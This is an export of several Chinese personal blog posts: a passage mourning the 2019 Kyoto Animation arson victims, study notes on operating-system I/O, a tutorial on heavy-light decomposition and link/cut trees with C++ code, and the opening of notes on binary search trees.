另外，关于京都的人员。从官网的数据来看的话，京都动画的员工应该是165名，平均年龄33.6岁，平均工作时间约为10年。可以说，这是一家很“小”的公司。另外，京都其实应该说是一家相对密闭的公司，其中的员工大多数都是来自于自家的培训，应该说，京都的门槛是很高的。也正是这样的精雕细啄，使得京都内的员工专业水平上都很高，夸张一点点说的话，每一个员工都可以说是动画行业中的瑰宝。 业界药丸？为什么会有这样的言论呢？据说(不一定正确)，一开始只是庵野秀明的一个梗，但也是有一定的现实依据。现在的日本动画业界，工资普遍低下，像原画师，甚至要养活自己都没有那么容易，而很多人之所以还能够坚持继续创作，也许就是对动画深深的热爱吧。当然，不得不提到的一点是，京阿尼在工资和福利上面还是很好的，可以说是业界良心了，采用的也是按小时计算工资的方式(和业界按件计的方式不太一样)，这也是很多公司内的员工愿意一直留在这里工作的重要原因。 为什么喜欢京都动画？我想，最直接的原因，就是他们对于动画的态度，几乎每一位动画工作者都是满怀着对动画的憧憬和热爱去制作的，因此，即便是京黑，也无法在画面制作这一点上对京都进行否定。”这光，，这水”“京都出品，必属精品”这样的话尽管有一点调侃的意味，却也正说明了动画人对作品认真负责的态度，看到自己亲手创作的人物动起来的那一剎那，也许正是像看到自己的孩子终于长大了的样子吧，欣慰，感动。 噩耗的发生 在临近中午(7.18)的时候，不经意间翻开了手机，上面看到了一个同学发过来的信息：京都动画发生了大火，很多人受伤。看到这个消息，第一个想法是这不会是假的吧？如果是真的话，那人没事吧？作品也没事吧？后面看了一下b站和知乎的消息：重伤10人，1人死亡，凶手是故意放火，原因仅仅是对京都动画不满。 怎么回事？？？ 不是怎么会有这种人？心中反反复复地祈祷着，原画没了就算了，人千万不要出事啊，拜托了。可事与愿违。紧接着，一个个噩耗不断传来，心肺停止10人，17人，死亡人数也在不断攀升，从一开始的1人，到4人，10人，17人，20人，25人，33人……够了，我不想再听下去了！颤抖的手不断地滑着屏幕，刷新键一次又一次地被按下，但收到的，却是一个又一个令人难受的消息。 说实话，即使到现在，我也有点感觉：这一定不是真的，我是在做梦吧？我最喜欢的京阿尼，业界标杆京阿尼竟然会迎来这样的一天。 どうして？そんなん酷いことをするなんで、あり得ない 且不论京阿尼做过了什么，都不应该受到放火这样的对待，这已经不仅仅是ACG界的事情了，毫不夸张地说，这已经算是大规模的恐怖袭击。难以想象，凶手在行凶前早已做足了充分的准备，买了40L的汽油，随身带了好几把刀具，堵在门口，这是怎样的一种心态，是有多大的深仇大恨才能做的出这样的事情？ 全然分からない 已经不幸离世的33名工作人员，我们能做的也只有祈福，也希望还活着的人能够坚强，走出阴影。今天到第一工作室上班的70名员工，他们也许永远也不会想到，早上妻子/丈夫准备的那分简单的早餐，竟是自己生前的最后一顿饭；他们也许永远也不会想到，早上乘上了电车后的轻轻的挥手，竟然化作了西边的云彩；他们也许永远也不会想到，自己最后的那个早晨描下的一比一划，竟是自己留给这个世界最后的礼物——这一切那么美好而又那么真实，却被区区一个纵火犯给烧得干干净净。是的，悲剧就是把美好的东西毁灭给人看。 前几天才看完白箱，第一次较为真实地了解到了业界的现状。一代传承着一代，靠着数十万人，经历了数年，数十年的努力，再加上与观众的感想和心意的结合，一部优秀的动画才能诞生。就像一颗小火苗，精心培养和传承下去，最终才能变成永不熄灭的火焰。而这些人的努力，却轻轻松松地被摧毁，这又是多么讽刺。 末 尽管知道，这样的日记不过是在自我安慰而已，也不会有人去看；尽管知道，二次元的文化确实存在许许多多的问题，放在全世界的天平上不过是沧海一粟；尽管知道，二次元只是理想，只是一个小群体的圈地自萌。也许这样说并不太恰当，但我觉得动画人可以算得上是最单纯的一群人，他们的目标不是什么尔虞我诈，也不是什么沧海桑田，而是一种对艺术的尊敬和追崇，对于这样的一个团体而言，动画就像一道光，照亮的是整个世界。 一生懸命アニメを作ってるのに 那33位staff们，我相信，你们并没有走，你们只是去了心中的”遙か彼方”，去看望他可爱的孩子们。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>animation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Modern Operating System Note(I) —— I/O]]></title>
    <url>%2F2019%2F06%2F12%2FI-O%2F</url>
    <content type="text"><![CDATA[prologue 这篇文章是关于《现代操作系统》的一些笔记，主要记录一些自己觉得比较有用的知识点。整体上可能是按照书中的顺序来写的，也有可能自己稍微再整合一下。主要目的还是加深自己的印象，把知识真正地读进脑子里。 整个章节大致按照如下的顺序，首先介绍IO的一些概念，其次简单了解一下IO硬件和软件的一些原则，然后再深入了解IO软件的结构，并理解他们之间是如何进行协作的。再接下来，较详细的了解一些具体的IO设备的工作原理。 what is I/O 什么是I/O？这是一个十分广泛的概念。简单来说，I/O就是Input/Output，即输入输出。为什么说它重要呢？在冯诺伊曼架构中，把计算机分成了存储器，控制单元，运算单元和输入输出这几个部分。换句话来书，我们可以把计算机看成是一个黑匣子，而输入输出就相当于它和外界进行信息交互的通道！对于一个计算机来说，我们希望在我们给它一定的输入后，它在经过计算后给予正确的输出。这些都涉及到了I/O。 同时，I/O既可以指字面意义上的输入和输出，也可以指一些I/O设备，像鼠标，键盘，磁盘，显示器等。 I/O hardware 由于I/O本身十分复杂，而且不同的I/O设备的架构区别也较大，在本章节中，我们主要关心的是可编程的I/O，即我们不会太去在意I/O内部究竟是怎样工作的。 I/O device I/O设备可以被分成两种类型。第一种是block devices，第二种是character devices。 如同字面上的意思，块设备内部信息的存储是按块分类的，往往内部块的大小是规定固定的，在写入和读取的时候都是以块为单位进行。像我们常见的磁盘，USB设备等都是属于block devices。 character devices则不同，它在输入和输出的时候是按照字节来的，即是以字节流的形式进行输入和输出操作。由于这个特性，这种设备的信息往往是不可编址的，像是打印机，网络接口都可以看成是character devices。 当然，事实上两者之间的界限并不严格，有一些设备是很难进行划定的，这样的分类方式只是便于我们去理解这些设备而已。 Device Controllers I/O设备往往可以分成机械组件和电子组件，其中，电子组件被称为I/O控制器或者适配器，通常需要插入在主板的(PCIe)拓展槽中。控制器和设备本身之间的接口是非常低层次的，比如磁盘在传输的时候，往往是传递一整个字节流，以一个前导码为开始，中间是4096字节的信息(一个扇区)，最后是一个检验和，或者是错误纠正码(ECC)。控制器在确认信息没有问题之后，或者有问题但是成功纠正过后，就可以把信息复制到主存当中了。 Memory-Mapped I/O 控制器往往都有一些寄存器用于和CPU的交互，通过将信息写入寄存器当中，我们可以执行一些指令，比如读取或者写入某些信息等，这些是控制寄存器。很多设备还有一些数据的缓冲区可以供操作系统进行读写操作。CPU和这些设备之间的交互有两种形式： 第一种是使用I/O端口号，有了这些端口后，我们就可以使用一些特别的指令进行操作了，比如 IN REG,PORTOUT PORT,REG 分别是PORT上的信息写入到寄存器REG当中，和把寄存器REG中的数据存储编号为PORT的I/O设备的控制寄存器中。 第二种是使用内存映射。将所有的控制寄存器以及缓冲的数据都映射到内存空间当中，这样的话就可以通过对内存进行读写操作实现和IO设备的交互。这个时候操作系统就必须在内存空间中留出足够大的地方用于和I/O设备之间的映射。 这两种做法都有各自的优缺点。使用内存映射的方式进行I/O的话，我们就不需要显式地访问I/O设备的控制寄存器，只需要像访问内存中的其他位置一样读取和写入数据即可。并且，如果要访问I/O设备的话，由于C/C++没有直接的可以访问的函数，我们只能在C代码中嵌入汇编代码，这就增加了编码的复杂性。 其次，内存映射I/O简化了进行I/O操作处理时的一些保护机制。如果各个I/O设备位于内存空间中不同的页，我们可以直接给某个进程中包含I/O设备的页一定的权限，它就可以进行I/O操作了，而这对其他进程而言是未知的。同时，这样的处理方式也使得设备驱动器可以放在不同的内存空间当中，既降低了内核的大小，也避免了驱动器之间的相互干扰。 第三，内存映射I/O使得每一个对内存的引用也可以变成对I/O设备控制寄存器的引用。如果没有这样的操作的话，在检查是否有I/O信号时，我们需要从I/O设备的控制寄存器中读取信息，移动到CPU上，再检查寄存器上的信息是否满足要求，这就增加了指令的数量，有时也会影响到了性能。 当然，事物都是具有两面性的，内存映射I/O也带来了不少的问题。首先，就是缓存。我们在引用内存的时候，会在CPU中进行缓存，而对于I/O设备来说，它们的状态信息是不应该被缓存的。比如我们把I/O设备现在是空闲的信息缓存在CPU中，那么接下来所有的访问该I/O设备的结果都是空闲的，这会导致严重的后果。因此，为了避免这样的现象发生，在硬件层次上就必须要有一定的操作使得某些内存空间不能被缓存在CPU上，这同样也增加了设计的复杂度。 Direct Memory Access 不管CPU有没有使用内存映射I/O，它总是需要对设备控制器进行编址以进行数据的交换。这个时候，CPU虽然可以从I/O控制器中一次获取一个字节的数据，但这明显太慢了。因此很多情况下采用了另外一种方案——DMA。在有DMA控制器的硬件上，操作系统往往必须使用它。DMA控制器往往有自己独立的系统总线，它还包括几个用于和CPU交互的寄存器，有自己独立的字节计数器，运输单元等。 书中给了这样一个图以直观地看出DMA的作用。 首先我们考虑一下没有DMA的情况下磁盘是如何读取数据的。磁盘读到一块数据后，放进自己的缓冲区中，在检查没问题后，磁盘控制器触发中断。操作系统收到后，在一个循环里一次读取一个字节的信息，然后存储在主存中。在有DMA的情况下，CPU首先对DMA进行编程，告诉它需要运输哪些东西到哪里。然后，DMA向磁盘控制器发出请求。磁盘控制器在确认信息无误后，将信息存储在主存中，并向DMA返回一个Ack进行确认。当所有信息传递完毕后，DMA向CPU发出中断。这个时候对操作系统来说，信息已经自动地从磁盘运输到内存当中了。 Interrupts Revisited 另外，硬件的中断的产生是需要一个叫控制器的东西的管理的。当I/O设备完成工作后，它向总线中发出一个信号，这个信号会被中断控制器检测到，以此决定接下来说什么。 如果没有其他中断在等待的话，这个时候中断控制器马上处理对应的中断，否则，该中断需要进行等待。处理中断时，控制器将一个数字放进指定的位置，以告诉CPU中断的产生源。CPU进行一定的终端处理后，返回Ack给中断控制器，此后中断控制器可以再次组织中断。 precise and imprecise Interrupts 中断产生时，需要对对应的中断进行处理。但我们知道，CPU内部是流水线结构的，即在同一个时刻，可能有多个指令在进行处理，不同的指令的处理进度不一定相同，这个时候如果触发了中断，则需要对已进入流水线但是还未处理完成的指令进行处理。其中，一种方法就是等待到当前执行的所有指令都执行完后再触发中断，这就是precise Interrupts。另外一种处理方法就是直接停下，但是需要在栈中记录每一个指令的处理进度。两种方法都各有优劣。等待的话有时会导致终端无法及时处理，而如果直接停下，又涉及到指令的执行状态的保存问题，这会极大程度上加大编码的复杂性。在x86系列中，采用的是两种混合的模式。 I/O software I/O软件层次较为复杂。其中一个关键概念就是设备的独立性。我们需要能写出一个通用 达成需能够同时访问任意的I/O设备，而不需要对命令进行更改。比如输入sort &lt; input &gt; output，程序就应该能读取一个文件作为输入，并输出到另一个文件中，而不管文件是位于磁盘，USB或者是其他I/O设备中。 另外一个重点的问题是错误的处理。有一些错误可能只是暂时的，比如磁盘上沾了一点灰尘，可能再次进行读取就好，而有些错误则需要对应的处理措施。 还有另外一个重要的问题是同步与异步。以及缓存等 three fundamental way I/O有三种基本的执行方式。包括programmed I/O, interrupt-driven I/O和I/O using DMA Programmed I/O 第一种重要的I/O方式是程序化的I/O。比如我们要打印“ABCD”这个字符串时，操作系统首先将字符串拷贝到内核空间中，然后向I/O设备发出请求，当可以访问时(I/O设备往往有对应的状态寄存器)，系统将”A”拷贝到设备中，然后等待，继续再将”B”拷贝到设备中，直至所有的字节拷贝完成。这种方式每次只输出一个字符，CPU不断地询问设备，确认设备是否可以进行下一个字节的传输。这种方式又被成为轮询(polling)或忙等待(busy waiting)。这种方式很占用CPU时间。当如果CPU经常处于空闲状态的话，这种方式也是一个可行的选择。123456copy_from_user(buffer, p, count); // p 是数据的首指针for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); *printer_data_register = p[i];&#125;return_to_user() Interrupt-Driven I/O 另外一种处理的方式是中断驱动。即每次拷贝信息后，判断信息是否处理完毕，未完毕则进入阻塞或进行其他代码的执行，直到收到中断。这是一种经典的异步编程方式123456789101112131415copy_from_user(buffer, p, count);enable_interrupts()while (*printer_status_reg != READY);*printer_data_register = p[0];scheduler();//if (count == 0) &#123; unlock_user()&#125; else &#123; *printer_data_register = p[i]; count = count - 1; i = i + 1; acknowledge_interrupt(); return_from_interrupt();&#125; 使用DMA进行I/O操作 使用中断驱动的I/O有个缺陷，就是当打印的速度较快时，常常会陷入中断状态，这也是很占用CPU时间的。因此，另一种做法是使用DMA。像在硬件层次一样，DMA负责将信息全部发送到printer，CPU就可以做自己的事情了。DMA中使用忙等待模式，当处理完成后，触发中断通知CPU即可。12345678// CPU操作copy_from_user(buffer, p, count);set_up_DMA_controller();scheduler();// 中断处理操作acknowledge_interrupt();unblock_user();return_from_interrupt(); I/O sofrware layers I/O软件可以组织成4个层次，如下图。每一个层次都能提供完善的接口给相邻的层次使用。 I/O sofrware layers User-level I/O software Device-independent operating system software Device driver Interrupt handlers Hardware Interrupt handlers 中断处理是I/O操作中不可或缺的部分。但是，处理一个中断的过程是十分复杂的。简单来说，进程会先进行阻塞(比如使用信号量)，直到收到中断后，取消阻塞状态。在中断处理时，可能包括但不限于以下操作： 保存寄存器数据 重新设置上下文，更新TLB，MMU和页表和栈，用于中断处理 发送Ack给中断控制器 复制寄存器的信息 运行中断处理函数 选择接下来运行的进程，并进行上下文的设置(TLB，MMU，页表等) 读取新的进程的寄存器数据 运行新的进程 Device Driver 设备驱动器，顾名思义是用于设备的驱动的。由于不同的设备之间的区别是很大的。比如鼠标的驱动器需要接受鼠标的信息，得到鼠标移动了多远，点击了哪个按钮等。而磁盘的驱动器需要知道磁道，扇区，柱面，磁臂等信息。因此，每一个I/O设备需要一个和设备高度相关的驱动器与之关联，这样才便于我们对设备的使用。 Device-Independent I/O 尽管有些I/O软件是设备相关的，有部分的设备需要设备无关。不过这两种类型的边界并不确定，和具体的系统有关。统一的设备驱动器接口： 对于相似的I/O设备，如果每一种设备对上层的接口都不相同的话，那么势必会造成严重的混乱，因此，对于比如SATA disk driver, USB disk driver, SCSI disk driver这几种类型，我们应该使用一个标准的接口，这样更便于进行设备的管理和使用。缓存： 很明显，每次都读取一小点信息到用户空间中是效率很低的，因此需要一定的缓存。我们可以在内核空间中开辟一段内存，然后设备获取到的信息直接复制到该内存区域。当内存满时，在复制给用户即可。但是，这样又有问题。如果在字符到来的时候，对应的缓存已满，那么就会发生一些问题。这个时候可以采用双缓冲。即一个缓冲在进行消息从内核空间到用户空间的复制的同时，另一个缓冲在进行从I/O设备到用户空间的复制。也可以采用另一种方式，环形缓冲，只需要保存头尾指针即可。 epilogue 这篇笔记主要都还是按照书中的内容写的，基本上写的都是自己觉得比较重要一点的知识点，但感觉还是很乱，可能是操作系统这块本身就比较复杂，很多知识点理解还是不太到位，感觉总是有一些矛盾的地方，希望在后面能逐渐解决。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>I/O</tag>
        <tag>Operating System</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Data Structure Note(IV) —— Link/Cut Tree]]></title>
    <url>%2F2019%2F06%2F06%2Fdata-structure4%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第四篇文章。在上一篇文章中，我们一起学习了两种平衡树——Treap和Splay，并简单地提到几道应用问题。在这篇文章中，我们再次换一个方向，学习一下Link/Cut Tree。这同样是一种比较难的数据结构，用于解决动态树问题。 tree chain split 在正式介绍LCT之前，我们先来了解一下树链剖分。这是一种常见的树上的算法，用于维护树上的路径信息。通过将树划分成多条链，并映射到一段连续的数组上，使得我们能够将许多常见的区间维护的数据结构推广到树上(比如线段树)。 比如我们可以来看下面的一张图，了解一下树链剖分究竟在做什么事情。(粗的线表示连成了一条链) 从这里，我们可以看到树链剖分的许多特性。整棵树被分成了4条链，分别是1-2-5-7, 3-6, 4, 8。并且，每一个节点属于且仅属于一条链。如果我们把每一条链按照顺序放进一个数组中的话，我们就成功地把一棵树映射到这个数组上了。 how to implement 树链剖分问题，简单来说就是轻重链划分的问题。具体来说，我们需要了解以下的概念： 重儿子和轻儿子：对于每一个节点，重儿子为size最大的那个儿子，其余的儿子为轻儿子，如图中，1号节点的重儿子为2，3号为轻儿子。 重边和轻边：与重儿子相连的边为重边，与轻儿子相连的边为轻边。 重链和轻链：由重边连接而成的路径为重链，相反，轻边连成的路径为轻链。 我们需要做的，就是将整棵树划分成数条重链。具体的实现操作方法为两次dfs。 12345678// 每个节点的父亲，重儿子，大小，深度int fa[N], son[N], size[N], dep[N];// 所在的重链顶端元素，链上的节点编号对应的线段树的编号，线段树对应的编号对应的链上的节点编号int top[N], tid[N], rnk[N];// 用链表组织每个点的边struct edge &#123; int to, next;&#125; e[N&lt;&lt;1]; 第一次dfs的时候，我们可以得到每一个节点的父亲，重儿子，轻儿子，大小和深度。1234567891011121314151617void dfs1(int rt) &#123; son[rt] = 0; size[rt] = 1; // 遍历链表 for (int d = link[rt]; d; d = e[d].next) &#123; int to = e[d].to; // 没有访问过则访问 if (!dep[to]) &#123; dep[to] = dep[rt] + 1; fa[to] = rt; dfs1(to); size[rt] += size[to]; // 选择size最大的那个为重儿子 if (size[to] &gt; size[son[rt]]) son[rt] = to; &#125; &#125;&#125; 第二次遍历的时候，我们由于知道了每个节点的子树大小，我们可以得到每一条链对应的顶端的节点，并且还可以顺便做从树到线性数组的映射。123456789101112131415void dfs2(int rt, int tp) &#123; top[rt] = tp; tid[rt] = ++tot; rnk[tot] = rt; // 没有重儿子，说明没有儿子了，返回 if (!son[rt]) return; // 有重儿子优先遍历，保证最后重链上的元素在线段树中是相邻的！ dfs2(son[rt], tp); // 遍历轻儿子，注意遍历的时候要做判断，防止再次访问到重儿子或者访问到父亲上去 // 并且，轻儿子的top为它自己 for (int d = link[rt]; d; d = e[d].next) if (e[d].to != son[rt] &amp;&amp; e[d].to != fa[rt]) &#123; dfs2(e[d].to, e[d].to); &#125;&#125; 经过上面的操作后，我们就可以得到一个数组，如前面的图所示。并且，我们可以通过维护这个数组来维护一整棵树的信息。假设这个时候我们使用线段树来维护这个数组，这个时候如果我们要查询8和7的路径上所有点的信息的话，我们可以拆分成[5,7]和[8]，这样，我们就只需要对线段树执行两次查询操作就可以得到答案。由于从根节点到任意节点的链的数量为O(logn)，而线段树区间查询的复杂度为O(logn)，最终我们对于树上路径的信息查询复杂度为O(log2n)，效率还是比较客观的。参考例题：洛谷P3384 link/cut tree 好了，在简单了解完树链剖分以后，我们进入正题，看一下LCT究竟是怎样实现的。 注意：此处LCT路径是用splay维护的，因此如果还不清楚splay是什么的话，建议先看上一篇文章 a simple problem 同样的，我们先来看这样一个问题： 维护一棵树，要求实现以下操作:修改两点间路径权值，查询两点间路径权值修改子树权值，查询子树权值和 这就是比较明显的树剖模板题了。使用树链剖分将树上的信息映射到数组，并用线段树维护即可。这个时候，如果更改一下条件，我们需要维护的不是一棵树，而是一片森林呢？这个时候就还涉及到树的合并和分离的问题，单纯的树链剖分就不太好做了。 这时，我们原先的思路就应该改一下，从而能够顺利解决动态树的问题。其中一种可行的解法就是LCT。 what is LCT LCT是一种用于维护一片森林之间的信息的数据结构，被用来解决动态树问题。它能够实现边的加入和删除，任意两点间的距离信息，连通性，也支持信息的修改等。其中，LCT用到了树链剖分的思想，并且使用splay来进行链的维护。也可以这样理解，LCT实现的是动态的树链剖分。 some basic concept 在理解LCT之前，我们需要先来看一些概念。 实链与虚链，类似于树链剖分中的重链和轻链的概念，但实链与虚链是动态的，即可以随时发生更改。每一条实链(包含单个节点)构成了一棵splay树。并且，实链上的所有节点组成的序列是按照深度为关键字进行排序的，即所有splay中节点的左儿子在原先的树中是当前节点的祖先，节点的右儿子在原先的树中是当前节点的儿子！这是很关键的一点。 原树与辅助树。原树即由已知的信息构成的树，辅助树即我们需要去维护的数据结构，一棵辅助树对应一棵原树，一条链对应一个splay，因此，一个辅助树由多个splay组成。参考如下图(实链为实线，虚链为虚线，每一个绿色的区域包围了一个splay)： 通过辅助树，我们能够得到唯一的一棵原树，因此我们只需要维护辅助树即可。而一棵原树往往可以对应于多棵辅助树。并且，在辅助树中，每一棵splay满足中序遍历根节点得到是深度顺序的性质，不同的splay之间单向连接，儿子知道父亲，而父亲并不知道儿子是谁。 由辅助树的特点，我们还可以知道，辅助树是可以任意换根的(只要满足性质即可)，并且，在辅助树上能够实现虚链和实链的变换(后面会讲)，这也是我们使用LCT的核心方法。由于LCT需要的方法比较多，下面还是分类别介绍。 variables &amp; basic function LCT需要的变量也比较多，具体如下：123456789101112131415161718192021222324252627// 每个节点在辅助树中的父亲和儿子，ch[i][0]表示左儿子，ch[i][1]表示右儿子int fa[N], ch[N][2];// 每个节点在splay中的子树的大小，每个节点的值，每个节点在splay中的子树的权值和等等int sz[N], val[N], sum[N] ...// 翻转标记，用于根的更改操作bool rev[N];#define ls(x) ch[x][0]#define rs(x) ch[x][1]// 判断当前节点是否是父亲的右儿子，用于splay#define get(x) (x == ch[fa[x]][1])// 判断当前节点是否是splay中的根节点，注意到根节点和其他splay之间是单向连接的，// 如果不是根节点，那么必定是其父亲的左儿子或者右儿子。#define nRoot(x) (ch[fa[x]][0] == x || ch[fa[x]][1] == x)void up(int x) &#123; sz[x] = sz[ls(x)] + sz[rs(x)] + 1; sum[x] = sum[ls(x)] + sum[rs(x)] + val[x]; ...&#125;void down(int x) &#123; int l = ls(x), r = rs(x); if (l) &#123; // 标记下传... &#125; if (r) &#123; // 标记下传... &#125;&#125; splay operation 首先，我们需要处理维护splay需要的一些函数。具体和前面splay的写法其实基本上是一样的，除了rotate中需要注意一下和祖先节点的连接，以及splay中需要先将标记下传。12345678910111213141516171819202122232425262728// 旋转操作，和splay类似void rotate(int x) &#123; int y = fa[x], z = fa[y], k = get(x); // 注意，此处应该写在前面，否则nRoot判断会出问题 if (nRoot(y)) ch[z][ch[z][1] == y] = x; ch[y][k] = ch[x][k^1]; fa[ch[x][k^1]] = y; ch[x][k^1] = y; fa[y] = x; fa[x] = z; up(y);up(x);&#125;// 从上到下更新当前splay树的根节点到x路径上的点void update(int x) &#123; if (nRoot(x)) update(fa[x]); if (rev[x]) down(x);&#125;// 将当前节点旋转到对应的splay树的根节点void splay(int x) &#123; // 这里由于当前节点的父亲可能具有标记没有下传，应该先将路径上所经过的节点的标记下传，再进行splay update(x); int f = fa[x]; while (nRoot(x)) &#123; if (nRoot(f)) rotate(get(f) == get(x) ? f : x); rotate(x); f = fa[x]; &#125;&#125; core method 接下来这里就是splay的核心方法了。主要有access和mk_root两个。 access access函数的作用在于，打通当前辅助树中，根节点到某个节点x的路径，即通过虚实链的变换使得节点x与根节点位于同一棵splay中，并且，打通后，在x和根节点所在的splay中，x会成为深度最大的那个节点。且access过后，根节点有可能会发生改变！为了更好的理解access的过程，这里引用一下论文的图片(其中的preferred path在此处即是实链)。 考虑一下如果我们要来实现这样的一个过程，那应该怎么处理呢？ 首先假设最简单的情况，点x和根节点在同一棵splay上面，这个时候我们的处理方式其实就很简单了，只要对x进行splay操作，移动到splay树的根节点，然后单方向地断开x和它的右儿子即可。这个时候满足x是这棵splay的深度最大的点！(右儿子被从这棵树中赶出去了，形成了另外一棵splay树) 我们之前的图，调用access(3)后，应该变成了这个样子： 其次，我们再来考虑更复杂一点的情况，点x位于splay树A，辅助树的根节点位于splay树B，且树A和B之间直接连接。这个时候就比较麻烦了。但我们还是可以借鉴之前的思路。同样的，我们把点x用splay移动到树A的根节点，并且和右儿子单向断开，分成两棵树C和D，然后，对x的父亲y(由于A和B之间是直接链接的，此时y应该是在树B当中)，我们把它移动到根节点，并且断开右子树，并且，右儿子接到点x上，这个时候，我们就完成了！此时x和根节点在同一棵splay上，且x的深度是最大的。 同样的，我们之前的图，调用access(5)后，应该变成了这个样子： 那么，如果他们之间不是相邻的呢？其实思路是一样哒! 当然，说是很复杂，实际上代码却很短：1234567void access(int x) &#123; for (int p = 0; x; p = x, x = fa[x]) &#123; splay(x); ch[x][1] = p; up(x); &#125;&#125; 总的来说，流程大致为：使用splay(x)将当前节点移动到splay树的根节点，并单向断开和右儿子的连接，将右儿子接向上一棵splay树，不断循环，直到到达根节点，此时fa[x]=0，退出。注意到，access事实上是从底向上进行连接的。另外，别忘了up操作 mk_root 理解好之前的access操作后，这个操作也就变得很简单了。make_root(x)，将当前节点变成原树的根节点。这看似很难，实际上只需要用到我们之前的写的几个函数即可。 我们考虑一下，如果要让当前节点作为辅助树的根节点的话，那么它有什么特点？它没有父亲！换句话说，它的深度在其所在的树中是最小的。我们有什么好办法可以实现这个呢？ 前面我们的access操作我们说，access(x)之后，x和根节点位于同一棵splay树中，且x是深度最大的。那么我们如果使用splay操作将x移动到根节点之后，会发生什么？——x的右儿子是空的，节点都在它的左儿子上，这个时候我们如果再使用reverse操作，x的左儿子就空了，这个时候x就变成了splay树中深度最小的那个节点了。换句话说，也就变成了原树的根节点了！另外，别忘了打标记。 代码如下：123456void mk_root(int x) &#123; access(x); splay(x); rev[x] ^= 1; swap(ls(x), rs(x));&#125; other function 有了之前的那几个操作之后，现在我们几乎可以实现一切了！ find 首先是find操作，用于查找节点x所在的原树的根节点。我们只要将原先的根节点和x连通，再把x移动到根节点处，最后不断向左儿子找，就能得到根节点的。思路是很简单的。123456789101112int find(int x) &#123; access(x); splay(x); while (ls(x)) &#123; if (rev[x]) down(x); x = ls(x); &#125; // 此处splay(x)是为了保证find操作过后，根节点没有发生改变，这句话其实也可以不要 // 但是后面的link和cut操作就需要做稍微一点点修改 splay(x); return x;&#125; link 另一个很常见的操作就是link，将两棵树连接到一起。这里要考虑两种情况。 第一种是连接的两个点保证合法，那么我们只需要将其中一个点移动到其所在树的根节点，并进行更新操作即可。第二种是两个点不保证合法，那么我们必须确认合法性。什么情况下是不合法的呢？就是两个点本来就已经位于同一棵树中了，这个时候直接连接就破坏了树结构。因此，我们可以直接通过find函数确定x和y是不是在同一棵树上即可。 代码也很简单，如下：1234567void link(int x, int y) &#123; mk_root(x); // 保证合法，直接连接 fa[x] = y; // 不保证合法的话，需要先做判断 if (find(y) != x) fa[x] = y;&#125; cut 有了连接操作，那么必然也会有删除操作，对于两个节点来说，实现删除操作明显比连接操作要复杂一些。先考虑必然合法的情况，我们可以将x使用mk_root移动到根节点，注意到合法性，这个时候x的右儿子必定是y。这个时候只需要双向断开连接即可。 接下来考虑不合法的情况，总共有多少种情况呢？首先，第一种情况就是x和y不在同一棵树上，那么我们可以使用find函数判断。第二种情况是x和y在同一棵树上，但是他们没有直接连接，这造成的影响就是，mk_root之后，y的父亲不是x或者y有左儿子！(有左儿子的话说明x和y在原树中不是直接连接的) 代码如下：1234567void cut(int x, int y) &#123; mk_root(x); // 不保证合法的话，此处需要做一下判断 if (find(y) != x || fa[y] != x || ch[y][0]) return; fa[y] = rs(x) = 0; up(x);&#125; split 接下来，还有一个常见的操作，就是区间的提取。为了方便区间的操作，我们再分离出这样的一个函数，可以把x和y路径上的所有节点提取出来(保证x和y连接)。最后我们可以通过y节点获取整条路径的信息。123456void split(int x, int y) &#123; mk_root(x); access(y); // 此处还是需要splay(y) 因为access后x不一定是splay的根了 splay(y)&#125; summary LCT是一种灵活性极强的数据结构，可以实现很多意想不到的功能，当然，它也有一些缺点，比如代码量往往比较大，容易写出bug，还有虽然复杂度是O(log2n)，但是常数比较大等等。但这也不影响它的广泛应用。如果有时间的话，还是可以好好了解一下的。比如做两道题什么的 推荐题目: Sdoi2008Cave 洛谷P3690 epilogue 这样，到这里，我们的数据结构大杂烩系列的第四期就结束了，在这篇文章中，我们一开始先简单地提到了树链剖分(很重要的算法，最好要会)，接着，由树链剖分的思想，我们引申到了LCT这种神奇的结构，并且，讲了LCT一些基本的函数和它的思想，最后推荐大家还是去做两道题熟练一下吧。 然后之前说好的第四期写红黑树。。网上的介绍太多了，而且我看了下它们讲的好详细啊。所以我想想还是不写了。对，没错，我就是鸽子王！ 接下来的话，感觉短时间内可能不会继续更新了，或者换一个话题写了。 参考资料：oi-wiki/Link Cut Tree]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>Link/Cut Tree</tag>
        <tag>Chain split</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Data Structure Note(III) —— Balanced Tree]]></title>
    <url>%2F2019%2F05%2F28%2Fdata-structure3%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第三篇文章。在前两篇文章中，我们主要学习了线段树，树状数组，以及线段树的可持久化版本(主席树)，还稍微提了一下树套树的内容。今天，我们重新换了一个方向——介绍树结构中的另一种及其重要的类型——平衡树。这种数据结构比较难，却很常见(比如set容器)，因此我们需要较好地理解与掌握。 a simple problem 我们还是先来看这样一个问题： 给定一个无序数组，查找数字v是否位于数组当中 很显然，遇到这样一个问题，我们最直接的想法就是遍历即可，复杂度为O(n)。但是，如果有多次查找操作的话，一个更好的办法应该是排序，预处理为O(nlogn)，然后使用二分查找，单次查询复杂度O(logn)，相当不错，但是，如果问题包含了添加和删除操作，那么在每次插入后都要对整体进行排序，效率就比较低了。这个时候我们考虑引入BST。 binary search tree 在正式进入平衡树之前，我们先来看一下一种更基础的结构——二叉查找树(binary search tree)。和它的名字一样，这是一种用于高效查找和插入的基础数据结构，最好情况下，查找和插入的复杂度均为O(logn)。其插入和查找的代码大致如下(其实本质上它就是一个二分查找的过程)：1234567891011121314// 查找时，如果v大于当前节点，说明v若存在，只能位于右子树当中。// 同理，v小于当前节点，则只能位于左子树当中。bool search(Node* rt, int key) &#123; if (rt == null) return false; if (rt-&gt;v &lt; key) return search(rt—&gt;rson, key); else if (rt-&gt;v &gt; key) return search(rt-&gt;lson, key); else return true;&#125;Node* insert(Node* rt, int key) &#123; if (rt == null) rt = new Node(key) else if (rt-&gt;v &lt; key) rt-&gt;lson = insert(rt-&gt;lson, key); else rt-&gt;rson = insert(rt-&gt;rson, key) return rt;&#125; 